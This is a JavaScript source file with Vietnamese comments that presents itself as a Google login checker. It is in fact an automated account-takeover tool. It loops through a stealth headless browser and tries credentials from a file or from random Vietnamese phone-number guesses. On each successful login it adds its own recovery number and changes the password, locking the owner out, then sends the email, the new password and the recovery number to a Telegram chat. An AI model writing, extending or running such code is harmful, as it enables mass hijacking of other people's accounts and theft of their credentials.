// 📦 Phiên bản đầy đủ nhất của hệ thống Google Login Checker
const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
require('dotenv').config();

const { randomLoginData, typePassword, delay, getRapt, exists, sendTelegramMessage, changeGooglePassword, waitForRecoveryAdd } = require('phonevn');

const app = express();
const PORT = process.env.PORT || 3000;
let accountList = loadAccountsFromTxt();
let accountIndex = 0;
let phoneCount = 0;
let page = null;
let mID = null;
let mLoaded = false;
let mPassword = null;
let mRecovery = null;
let screenshotCount = 0;
const stepDir = path.join(__dirname, 'steps');

// 📁 Middleware
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/steps', express.static(stepDir));

// 🔄 Tải tài khoản từ file
function loadAccountsFromTxt(txtFile = 'accounts.txt') {
  const filePath = path.join(__dirname, txtFile);
  if (!fs.existsSync(filePath)) return [];
  return fs.readFileSync(filePath, 'utf-8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line && !line.startsWith('#'))
    .map(line => {
      const [emailOrPhone, password] = line.split(',');
      return { emailOrPhone, password };
    });
}

function logStep(message) {
  const now = new Date().toLocaleTimeString();
  console.log(`[${now}] [STEP] ${message}`);
}

function ensureStepDir() {
  if (!fs.existsSync(stepDir)) fs.mkdirSync(stepDir);
}

function clearStepFolder() {
  if (fs.existsSync(stepDir)) {
    fs.readdirSync(stepDir).forEach(file => {
      fs.unlinkSync(path.join(stepDir, file));
    });
    logStep('🧹 Đã dọn thư mục steps');
  }
  screenshotCount = 0;
}

async function captureStep(page, stepName = 'step') {
  ensureStepDir();
  const fileName = `${String(screenshotCount).padStart(2, '0')}_${stepName}.png`;
  const filePath = path.join(stepDir, fileName);
  await page.screenshot({ path: filePath });
  logStep(`📸 Đã chụp ảnh: ${fileName}`);
  screenshotCount++;
}

// 🌐 Route hiển thị HTML ảnh
app.get('/steps/view', (req, res) => {
  const files = fs.existsSync(stepDir)
    ? fs.readdirSync(stepDir).filter(f => f.endsWith('.png'))
    : [];
  const html = `
  <html><head><title>Steps</title><style>
    body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
    img { width: 600px; margin: 10px 0; border: 1px solid #ccc; box-shadow: 0 0 5px #aaa; }
    .item { margin-bottom: 30px; }
  </style></head><body>
  <h2>📸 Các bước đăng nhập</h2>
  ${files.map(f => `<div class='item'><img src='/steps/${f}' /><div>${f}</div></div>`).join('')}
  </body></html>`;
  res.send(html);
});

puppeteer.use(StealthPlugin());
app.listen(PORT, () => console.log(`🚀 Express đang chạy tại http://localhost:${PORT}`));

// 🧠 Gọi vòng lặp login
(async function loop() {
  const name = process.env.username || 'anonymous';
  await sendTelegramMessage(`📲 ${name} is running`);
  while (true) {
    try {
      await startBrowser();
    } catch (err) {
      console.error('[LOOP] Lỗi:', err.message);
    }
    await delay(10000);
  }
})();

// ✅ Hàm chính
async function startBrowser() {
  logStep('Khởi động trình duyệt và bắt đầu quy trình đăng nhập');
  clearStepFolder();
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: false,
      headless: 'new',
      args: [
        '--no-sandbox', '--disable-notifications',
        '--disable-setuid-sandbox', '--ignore-certificate-errors',
        '--disable-dev-shm-usage'
      ],
      executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
    });

    let pages = await browser.pages();
    page = pages[0];
    let foundPasswordPage = false;
    let phone, password, emailOrPhone;

    while (!foundPasswordPage) {
      if (accountList.length > 0 && accountIndex < accountList.length) {
        ({ emailOrPhone, password } = accountList[accountIndex++]);
        logStep(`📤 Dùng tài khoản từ file: ${emailOrPhone}`);
      } else {
        ({ phone, password } = randomLoginData());
        phoneCount++;
        emailOrPhone = '84' + phone.replace(/^0/, '');
        logStep(`📤 Tạo tài khoản random: ${emailOrPhone}`);
      }
      await page.goto("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity", { waitUntil: 'load', timeout: 0 });
      await captureStep(page, 'goto_login');
      await delay(1000);
      await page.type('#identifierId', emailOrPhone);
      await captureStep(page, 'typed_email');
      await delay(1500);
      await page.click('#identifierNext');
      await delay(4000);
      await captureStep(page, 'after_next');

      const url = await page.url();
      if (url.includes('/challenge/pwd')) {
        foundPasswordPage = true;
      }
    }

    await typePassword(page, password);
    await captureStep(page, 'typed_password');
    await delay(3000);

    const { status, message } = await detectLoginStatus(page);
    logStep(`⛳ Trạng thái: ${status} - ${message}`);
    await captureStep(page, `status_${status}`);
    if (status !== 1 && status !== 8) return;

    mRecovery = randomLoginData().recover;
    mPassword = randomLoginData().password2;

    await page.goto('https://myaccount.google.com/signinoptions/rescuephone', { waitUntil: 'load', timeout: 0 });
    await delay(4000);
    await captureStep(page, 'rescue_page');

    const email = await page.evaluate(() => {
      const el = document.querySelector('div[jsname="bQIQze"].IxcUte');
      return el ? el.innerText.trim() : null;
    });

    if (!email) return;
    const mRapt = await getRapt(await page.url());
    await waitForRecoveryAdd(page, mRapt, mRecovery);
    await captureStep(page, 'added_recovery');
    await changeGooglePassword(page, mRapt, mPassword);
    await captureStep(page, 'changed_password');

    await sendTelegramMessage(`✅ ${email} | ${mPassword} | ${mRecovery} | ${phone || emailOrPhone}`);
  } catch (err) {
    logStep('[ERROR] ' + err.message);
  } finally {
    if (browser) await browser.close();
  }
}
